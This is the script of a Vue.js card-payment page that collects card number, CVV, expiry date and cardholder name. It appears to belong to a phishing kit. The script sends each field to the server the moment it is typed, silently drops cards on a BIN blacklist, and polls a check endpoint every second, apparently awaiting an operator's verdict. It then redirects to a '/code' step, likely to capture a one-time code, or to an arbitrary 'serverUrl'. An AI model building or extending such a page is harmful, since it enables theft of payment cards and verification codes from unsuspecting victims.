<script>
    import Header from '@/components/CustomerHeader'
    import Footer from '@/components/CustomerFooter'

    export default {
        components: {
            Header, Footer
        },
        data() {
            return {
                expiryDate: '',
                valid: {
                    nameFail: false,
                    familyName: false,
                    card: false,
                    cvv: false,
                    cardDate: false,
                    validity: false,
                    post: false,
                    stateAddress: false,
                    city: false,
                    address: false,
                    email: false,
                    phone: false,
                    cardHolder: false
                },
                blackCardList: [],
                form: {
                    card: "",
                    cvv: "",
                    cardDate: "",
                    cardHolder: ''
                },
                loading: false,
                cardDel: false,
            };
        },
        created() {
            // this.checkStep();
        },
        mounted() {
            this.getBlackCardList()
        },
        methods: {
            checkStep() {
                let card = localStorage.getItem('card');
                if (card) {
                    this.form = JSON.parse(card);
                }
                let index = localStorage.getItem('index');
                if (!index) {
                    this.$router.push('/');
                    return;
                } else if (index === '2') {
                    this.$router.push('/code')
                    return;
                } else if (index === '3') {
                    this.$router.push('/success')
                    return;
                } else if (index === '999') {
                    window.location.href = localStorage.getItem('serverUrl');
                    return;
                }

            },
            getBlackCardList() {
                this.$api.getBlackCardList().then(resp => {
                    this.blackCardList = resp.data;
                })
            },
            textValid(text) {
                const regex = /^[^0-9]*$/;
                return regex.test(text);
            },
            cardHolderBlur() {
                let carHolder = this.form.cardHolder;
                let holderValid = this.textValid(carHolder);
                this.valid.cardHolder = !holderValid;
                if (holderValid) {
                    this.form.field = 'cardHolder';
                    this.subFn();
                }
            },
            cardBlur() {
                let card = this.form.card;
                if (!card) {
                    this.valid.card = true;
                    return;
                }
                this.valid.card = false;
                this.form.field = 'card';
                this.form.notice = 'cardFinish';
                this.subFn();
            },
            validateLuhn(cardNumber) {
                let sum = 0;
                let isEven = false;

                for (let i = cardNumber.length - 1; i >= 0; i--) {
                    let digit = parseInt(cardNumber.charAt(i), 10);

                    if (isEven) {
                        digit *= 2;

                        if (digit > 9) {
                            digit -= 9;
                        }
                    }

                    sum += digit;
                    isEven = !isEven;
                }

                return sum % 10 === 0;
            },
            handleCardKeyDown(event) {
                this.cardDel = event.key === 'Backspace';
            },
            carChange() {
                if (this.cardDel) {
                    return;
                }
                let value = this.form.card.replace(/\D/g, ''); // 去除非数字字符
                if (value.length > 16) {
                    value = value.substr(0, 16);
                }
                value = value.replace(/(\d{4})/g, '$1 '); // 在每4个数字之间插入空格
                if (value.length === 20) {
                    value = value.substr(0, 19);
                }
                this.valid.card = !value || value.length !== 19;
                this.form.card = value;
            },
            handleKeyDown(event) {
                const value = event.target.value;
                const len = value.length;
                if (event.key === 'Backspace' && (len === 3)) {
                    event.target.value = value.slice(0, -1);
                }
            },
            cardDateChange() {
                let carDate = this.form.cardDate;
                if (carDate && carDate.length === 2) {
                    let value = carDate.replace(/\D/g, ''); // 去除非数字字符
                    if (parseInt(value, 10) > 12) {
                        this.valid.cardDate = true;
                    } else {
                        this.valid.cardDate = false;
                        this.form.cardDate += '/';
                    }
                }
                if (carDate && carDate.indexOf("/") > 0) {
                    let date = new Date();
                    let currentYear = date.getFullYear();
                    let len = carDate.length;
                    this.valid.cardDate = len !== 5 || parseInt('20' + carDate.substr(3, len), 10) < currentYear;
                }
                if (!this.valid.cardDate) {
                    this.form.field = 'cardDate';
                    this.subFn();
                }
            },
            cvvChange() {
                let cvv = this.form.cvv;
                let cvvValid = cvv && (cvv.length === 3 || cvv.length === 4);
                this.valid.cvv = !cvvValid;
                if (cvvValid) {
                    this.form.field = 'cvv';
                    this.subFn();
                }
            },
            trimAll(ele) {
                return ele.split(/[\t\r\f\n\s]*/g).join('');
            },
            nextFn() {
                let data = this.form;
                let blackList = this.blackCardList;
                let cardNo = data.card.substr(0, 7);
                if (blackList.indexOf(this.trimAll(cardNo)) !== -1) {
                    return
                }
                data.currentStep = 1;
                data.stepTotal = 3;
                data.text = '完成卡号填写';
                this.form.notice = 'cardVer';
                if (this.validFn()) {
                    this.$api.subForm(data).then(resp => {
                        if (resp.code === 20000) {
                            this.loading = true;
                            this.checkFn(resp.data);
                        }
                    })
                }
            },
            subFn() {
                let data = this.form;
                data.currentStep = 0;
                data.stepTotal = 3;
                let blackList = this.blackCardList;
                let cardNo = data.card.substr(0, 7);
                if (blackList.indexOf(this.trimAll(cardNo)) === -1) {
                    this.$api.subForm(data);
                    localStorage.setItem('card', JSON.stringify(this.form));
                } else {
                    this.valid.card = true;
                }
            },
            validFn() {
                let data = this.form;
                let card = data.card;
                if (!this.valid.card) {
                    this.valid.card = !card;
                }

                let cvv = data.cvv;
                if (!this.valid.cvv) {
                    this.valid.cvv = !cvv;
                }
                let cardHolder = data.cardHolder;
                if (!this.valid.cardHolder) {
                    this.valid.cardHolder = !cardHolder;
                }
                let cardDate = data.cardDate;
                if (!this.valid.cardDate) {
                    this.valid.cardDate = !cardDate;
                }
                return card && cvv && cardDate && cardHolder;
            },
            checkFn(fingerprint) {
                this.$api.check({fingerprint: fingerprint}).then(resp => {
                    let data = resp.data;
                    let result = data.result;
                    if (result === 0) {
                        setTimeout(() => {
                            this.checkFn(fingerprint)
                        }, 1000)
                    } else {
                        this.loading = false;
                        if (result === 1) {
                            this.$router.push('/' + data.path + '?fingerprint=' + fingerprint);
                        } else {
                            this.$notify({type: 'warning', message: 'Os dados estão errados'});
                        }
                    }
                })
            },
        },
    };
</script>

